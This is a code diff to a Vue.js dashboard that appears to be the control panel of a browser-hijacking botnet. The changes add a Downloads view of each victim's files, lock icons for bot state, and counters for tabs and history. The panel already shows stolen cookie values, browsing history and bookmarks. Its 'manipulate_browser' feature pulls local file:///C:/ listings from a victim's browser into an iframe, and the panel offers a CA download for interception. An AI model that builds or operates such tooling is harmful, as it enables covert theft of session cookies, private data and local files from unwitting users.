@@ -174,7 +174,20 @@
                       ></b-img>
                     </td>
                     <td scope="row" style="vertical-align: middle">
-                      {{ bot.name }}[{{ bot.state }}]
+                      {{ bot.name }}
+
+                      <b-icon
+                        v-if="bot.state == 'locked'"
+                        icon="lock-fill"
+                        class="rounded bg-primary p-1"
+                        variant="light"
+                      ></b-icon>
+                      <b-icon
+                        v-else
+                        icon="unlock-fill"
+                        class="rounded bg-danger p-1"
+                        variant="light"
+                      ></b-icon>
                     </td>
                     <td style="vertical-align: middle">
                       <div>
@@ -364,14 +377,16 @@
                   v-if="bots_map[id_bot_selected].tabs"
                   v-on:click="tabs_tab_show = !tabs_tab_show"
                   v-b-toggle.sidebar-tabs
-                  >Tabs</b-button
+                  >Tabs[{{ bots_map[id_bot_selected].tabs.length }}]</b-button
                 >
                 <b-button
                   variant="warning"
                   v-if="bots_map[id_bot_selected].history"
                   v-on:click="history_tab_show = !history_tab_show"
                   v-b-toggle.sidebar-history
-                  >History</b-button
+                  >History[{{
+                    bots_map[id_bot_selected].history.length
+                  }}]</b-button
                 >
               </b-button-group>
 
@@ -392,7 +407,9 @@
                     v-for="tab in bots_map[id_bot_selected].tabs"
                     v-bind:key="tab.id"
                   >
-                    <b-link :href="tab.url"> {{ tab.title }}</b-link>
+                    <b-link target="_blank" :href="tab.url">
+                      {{ tab.title }}</b-link
+                    >
                   </b-list-group-item>
                 </b-list-group>
               </b-sidebar>
@@ -442,7 +459,7 @@
                         <b-badge href="#" variant="primary">{{
                           history.visitCount
                         }}</b-badge></span
-                      >&nbsp;<b-link :href="history.url">{{
+                      >&nbsp;<b-link target="_blank" :href="history.url">{{
                         history.title
                       }}</b-link>
                     </p>
@@ -474,11 +491,11 @@
                     <b-table
                       id="cookies_table"
                       :items="bots_map[id_bot_selected].cookies"
-                      :field="cookies_fields"
+                      :fields="cookies_fields"
                       :current-page="cookies_page"
                       :per-page="cookies_page_size"
                       :filter="cookies_search_word"
-                      :filter-included-fields="filterOn"
+                      :filter-included-fields="cookies_filterOn"
                       small
                       hover
                       :tbody-tr-class="cookies_row_class"
@@ -499,15 +516,14 @@
                 </b-tab>
                 <b-tab title="BookMarks">
                   <b-tree-view
-                    :data="bots_map[id_bot_selected].bookmarks"
-                    nodeLabelProp="title"
-                  >
-                    <template v-slot="{ node: { title, url } }">
-                      <b-link :href="url">{{ title }}</b-link>
-                    </template>
-                  </b-tree-view>
+                    :data="
+                      transformTreeData(bots_map[id_bot_selected].bookmarks)
+                    "
+                    @nodeSelect="openNode"
+                    nodeLabelProp="text"
+                  ></b-tree-view>
                 </b-tab>
-                <b-tab title="Config">
+                <b-tab title="Config" lazy>
                   <div>
                     <b-input-group prepend="Bot Name" class="mt-3">
                       <b-form-input
@@ -534,12 +550,81 @@
                     </b-button>
                   </div>
                 </b-tab>
-                <b-tab title="Browser">
+                <b-tab title="Downloads" lazy>
+                  <div style="overflow-x: auto">
+                    <b-input-group size="sm">
+                      <b-form-input
+                        id="downloads-filter-input"
+                        v-model="downloads_search_word"
+                        type="search"
+                        placeholder="Search filename"
+                      ></b-form-input>
+
+                      <b-input-group-append>
+                        <b-button
+                          :disabled="!downloads_search_word"
+                          @click="downloads_search_word = ''"
+                          >Clear</b-button
+                        >
+                      </b-input-group-append>
+                    </b-input-group>
+
+                    <b-table
+                      id="downloads_table"
+                      :items="bots_map[id_bot_selected].downloads"
+                      :fields="downloads_fields"
+                      :current-page="downloads_page"
+                      :per-page="downloads_page_size"
+                      :filter="downloads_search_word"
+                      :filter-included-fields="downloads_filterOn"
+                      small
+                      hover
+                      @filtered="on_downloads_filtered"
+                    >
+                      <template #cell(startTime)="data">
+                        {{ convertToCurrentTimeZone(data.value) }}
+                      </template>
+
+                      <template #cell(url)="data">
+                        <b-link target="_blank" :href="data.value">{{
+                          data.item.filename
+                        }}</b-link>
+                        &nbsp;-&nbsp;
+                        <b-link target="_blank" :href="data.item.finalUrl"
+                          >🔍</b-link
+                        >
+                      </template>
+
+                      <template #cell(totalBytes)="data">
+                        <b-progress
+                          :value="(data.item.bytesReceived * 100) / data.value"
+                          :max="100"
+                          animated
+                        ></b-progress>
+                      </template>
+                    </b-table>
+                  </div>
+                  <b-pagination
+                    striped
+                    hover
+                    fixed
+                    responsive
+                    stacked
+                    v-model="downloads_page"
+                    :total-rows="bot_length_map[id_bot_selected].downloads"
+                    :per-page="downloads_page_size"
+                    aria-controls="downloads_table"
+                  ></b-pagination>
+                </b-tab>
+                <b-tab title="Browser" lazy>
                   <p>
                     <b-input-group prepend="Path" class="mt-3">
                       <b-form-input v-model="check_path"></b-form-input>
                       <b-input-group-append>
-                        <b-button variant="info" v-on:click="manipulate"
+                        <b-button
+                          variant="info"
+                          :disabled="manipulate_browser_loading"
+                          v-on:click="manipulate"
                           >Check</b-button
                         >
                       </b-input-group-append>
@@ -621,6 +706,8 @@
   </div>
 </template>
 <script>
+import moment from "moment";
+
 export default {
   name: "Main",
   components: {},
@@ -656,9 +743,9 @@ export default {
       history_page_size: 20,
 
       cookies_search_word: "",
+      cookies_filterOn: ["domain", "name", "value"],
       cookies_page: 1,
       cookies_page_size: 20,
-      cookies_item_length: 0,
       cookies_fields: [
         { key: "domain", label: "domain", sortable: true },
         { key: "name", label: "name", sortable: true },
@@ -700,6 +787,70 @@ export default {
         { key: "storeId", label: "storeId", sortable: true },
         { key: "value", label: "value", sortable: true },
       ],
+
+      downloads_search_word: "",
+      downloads_filterOn: ["filename", "url", "startTime"],
+      downloads_page: 1,
+      downloads_page_size: 20,
+      downloads_fields: [
+        {
+          key: "startTime",
+          label: "startTime",
+          sortable: true,
+        },
+        {
+          key: "url",
+          label: "file",
+
+          sortable: true,
+        },
+        {
+          key: "fileSize",
+          label: "size",
+          sortable: true,
+          formatter: (value) => {
+            if (value < 1024) {
+              return value + "B";
+            } else if (value < 1024 * 1024) {
+              return (value / 1024).toFixed(2) + "KB";
+            } else if (value < 1024 * 1024 * 1024) {
+              return (value / 1024 / 1024).toFixed(2) + "MB";
+            } else if (value < 1024 * 1024 * 1024 * 1024) {
+              return (value / 1024 / 1024 / 1024).toFixed(2) + "GB";
+            }
+          },
+        },
+        {
+          key: "totalBytes",
+          label: "progress",
+          sortable: true,
+        },
+        {
+          key: "state",
+          label: "state",
+          sortable: true,
+          formatter: (value) => {
+            if (value === "in_progress") {
+              return "⌛️";
+            } else if (value === "complete") {
+              return "✅";
+            } else {
+              return "🚫";
+            }
+          },
+        },
+
+        {
+          key: "exists",
+          label: "exists",
+          formatter: (value) => {
+            return value === true ? "✅" : "🚫";
+          },
+          sortable: true,
+        },
+      ],
+
+      manipulate_browser_loading: false,
       check_path: "file:///C:/",
     };
   },
@@ -758,6 +909,13 @@ export default {
       this.user.password_should_be_changed =
         login_result.password_should_be_changed;
     },
+
+    convertToCurrentTimeZone(dateTimeString) {
+      const momentObj = moment(dateTimeString);
+      const convertedMoment = momentObj.utcOffset(moment().utcOffset());
+      return convertedMoment.format(); // 返回转换后的日期时间字符串
+    },
+
     async update_bot_config() {
       await api_request("PUT", "/bots", {
         bot_id: this.selected_bot.id,
@@ -775,23 +933,36 @@ export default {
       this.refresh_bots();
     },
     async manipulate() {
-      const response = await api_request("POST", "/manipulate_browser", {
+      this.manipulate_browser_loading = true;
+      await api_request("POST", "/manipulate_browser", {
         bot_id: this.selected_bot.id,
         path: this.check_path,
-      });
-      console.log(response);
-      const iframe = this.$refs.browser_page;
-      const iframeDocument =
-        iframe.contentDocument || iframe.contentWindow.document;
+      })
+        .then((response) => {
+          this.$toastr.s("Browser manipulated successfully.");
+          const iframe = this.$refs.browser_page;
+          const iframeDocument =
+            iframe.contentDocument || iframe.contentWindow.document;
 
-      iframeDocument.open();
-      iframeDocument.write(response.html);
-      iframeDocument.close();
+          iframeDocument.open();
+          iframeDocument.write(response.html);
+          iframeDocument.close();
+        })
+        .catch((e) => {
+          this.$toastr.e(e.error);
+        })
+        .finally(() => {
+          this.manipulate_browser_loading = false;
+        });
     },
     bot_open_options(bot_id) {
       console.log(bot_id);
       this.id_bot_selected = bot_id;
+
       this.selected_bot = copy(this.bots_map[bot_id]);
+      this.check_path = this.isWindowsUA(this.selected_bot.user_agent)
+        ? "file:///C:/"
+        : "file:///";
       this.$nextTick(() => {
         this.$bvModal.show("bot_options_modal");
       });
@@ -811,9 +982,28 @@ export default {
           cookies: bot.cookies ? bot.cookies.length : 0,
           history: bot.history ? bot.history.length : 0,
           bookmarks: bot.bookmarks ? bot.bookmarks.length : 0,
+          downloads: bot.downloads ? bot.downloads.length : 0,
           tabs: bot.tabs ? bot.tabs.length : 0,
         };
       });
+    },
+    transformTreeData(nodes) {
+      return nodes.map((node) => {
+        if (node.children) {
+          node.children = this.transformTreeData(node.children);
+        }
+
+        return {
+          ...node,
+          text:
+            node.url != undefined ? `${node.title}: ${node.url}` : node.title,
+        };
+      });
+    },
+    openNode(node) {
+      if (node.selected && node.data.url) {
+        window.open(node.data.url, "_blank");
+      }
     },
     download_ca() {
       window.location = `${BASE_API_PATH}/download_ca`;
@@ -821,7 +1011,6 @@ export default {
     copy_toast() {
       this.$toastr.s("Copied to clipboard successfully.");
     },
-
     async logout() {
       await api_request("GET", "/logout", false);
       this.user.is_authenticated = false;
@@ -850,7 +1039,17 @@ export default {
     },
     on_cookies_filtered(filtered_items) {
       this.cookies_page = 1;
-      this.cookies_item_length = filtered_items.length;
+      this.bot_length_map[this.id_bot_selected]["cookies"] =
+        filtered_items.length;
+    },
+    on_downloads_filtered(filtered_items) {
+      this.downloads_page = 1;
+      this.bot_length_map[this.id_bot_selected]["downloads"] =
+        filtered_items.length;
+    },
+    isWindowsUA(userAgent) {
+      const windowsRegex = /windows|win32/i;
+      return windowsRegex.test(userAgent);
     },
   },
   // Run on page load
